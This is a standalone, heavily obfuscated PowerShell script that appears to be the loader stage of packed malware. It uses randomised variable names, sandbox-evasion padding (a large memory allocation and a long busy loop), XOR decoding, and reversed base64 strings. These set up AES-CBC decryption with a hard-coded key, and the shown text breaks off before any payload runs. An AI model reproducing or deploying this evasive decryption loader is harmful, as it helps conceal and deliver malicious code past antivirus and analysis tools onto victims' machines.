$mjvkqsmpkt = (Get-Process -Id $PID | Select-Object Name,@{Name="WorkingSet";Expression={($_.ws / 1024kb)}}).WorkingSet
if ($mjvkqsmpkt -lt 250) { $ohrxikntjxtvvotkt = "a" * 300MB }
$ouuqyvzruqkxjxs = 0
$ygputtwspoyiqnjk = 30000000
For ($ouuqyvzruqkxjxs=0; $ouuqyvzruqkxjxs -lt $ygputtwspoyiqnjk;$ouuqyvzruqkxjxs++) { $ouuqyvzruqkxjxs++ }
$wiozvovjkzyizyxs = [System.Text.Encoding]::UTF8.GetBytes("zsimhvrjvxryghoyu")
$jpuxhnnnnkg = [System.Text.Encoding]::UTF8.GetBytes($mzyvnmnnjgoyg)
$isvxkypkvkrvsqu = $(for ($wwvzsxnwmmom = 0; $wwvzsxnwmmom -lt $jpuxhnnnnkg.length; ) {
    for ($okzxnuzrywtyquoky = 0; $okzxnuzrywtyquoky -lt $wiozvovjkzyizyxs.length; $okzxnuzrywtyquoky++) {
        $jpuxhnnnnkg[$wwvzsxnwmmom] -bxor $wiozvovjkzyizyxs[$okzxnuzrywtyquoky]
        $wwvzsxnwmmom++
        if ($wwvzsxnwmmom -ge $jpuxhnnnnkg.Length) {
            $okzxnuzrywtyquoky = $wiozvovjkzyizyxs.length
        }
    }
})
$isvxkypkvkrvsqu = [System.Text.Encoding]::UTF8.GetString($isvxkypkvkrvsqu)
$kigwvkrzhmug = "$isvxkypkvkrvsqu"
$rgwpoywruqtnv = $kigwvkrzhmug.ToCharArray()
[array]::Reverse($rgwpoywruqtnv)
$oyoytoviwgwik = -join($rgwpoywruqtnv)
$wnmsinmpgiuj = [System.Convert]::FromBase64String("$oyoytoviwgwik")
$yjvggymssu = [System.Convert]::FromBase64String("nKxPFQ6yhO25dFZt6rhrLiFVMY4akl1T4k/H/1xBpv0=")
$qooyqomwvuorqvn = "==gCkV2Zh5WYNNXZB5SeoBXYyd2b0BXeyNkL5RXayV3YlNlLtVGdzl3U"
$gtihzongqqpgorx = $qooyqomwvuorqvn.ToCharArray()
[array]::Reverse($gtihzongqqpgorx)
$voijgmtwpgvor = -join($gtihzongqqpgorx)
$zihiqmminv = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($voijgmtwpgvor))
$ittiyjjjjkmsjuri = New-Object "$zihiqmminv"
$mqzomnxinr = "==wQCNkO60VZk9WTyVGawl2QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"
$smhpusprzsk = $mqzomnxinr.ToCharArray()
[array]::Reverse($smhpusprzsk)
$owpqrxtqhywg = -join($smhpusprzsk)
$qxrmwwyopriq = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($owpqrxtqhywg))
$jwostnppsjs = & ([scriptblock]::Create($qxrmwwyopriq))
$ittiyjjjjkmsjuri.Mode = $jwostnppsjs
$wsumnioozrximkzjt = "==wMykDWJNlTBpjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"
$qputkgypwzoig = $wsumnioozrximkzjt.ToCharArray()
[array]::Reverse($qputkgypwzoig)
$xhjqtihnjkyktrho = -join($qputkgypwzoig)
$khhvohjinnmq = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($xhjqtihnjkyktrho))